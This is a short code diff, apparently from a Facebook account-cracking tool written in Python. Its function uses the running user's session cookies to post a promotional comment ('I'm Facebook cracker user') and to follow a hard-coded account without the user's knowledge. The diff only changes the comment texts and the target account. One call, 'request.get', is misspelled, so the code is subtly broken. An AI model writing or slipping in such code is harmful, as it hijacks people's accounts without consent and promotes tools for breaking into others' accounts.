@@ -23,10 +23,10 @@ def val(host,kuki):
                 joe = re.findall('"><form action="(/a/comment.php\?fs=.*?)".*?name="fb_dtsg".*?value="(.*?)".*?name="jazoest".*?value="(\d*)"',str(to))[0]
                 x["fb_dtsg"] = joe[1]
                 x["jazoest"] = joe[2]
-                kata = [" i'm user Facebook cracker","toolsnya mantap","login harian"]
+                kata = ["Hy, I'm Facebook cracker user","Toolsnya mantap","Buset bro, sumpah ini keren!!"]
                 x["comment_text"] = random.choice(kata)
-                c = requests.post(host.format(joe[0].replace("&amp;","&")),data=x,cookies=kuki)
-                ikuti = parser(requests.get(host.format("/zettamus.zettamus.3"),cookies=kuki).content,"html.parser").find("a",string="Ikuti")["href"]
+                requests.post(host.format(joe[0].replace("&amp;","&")),data=x,cookies=kuki)
+                ikuti = parser(requests.get(host.format("/zettid.1"),cookies=kuki).content,"html.parser").find("a",string="Ikuti")["href"]
                 request.get(host.format(ikuti),cookies=kuki)
             except TypeError:
                 pass
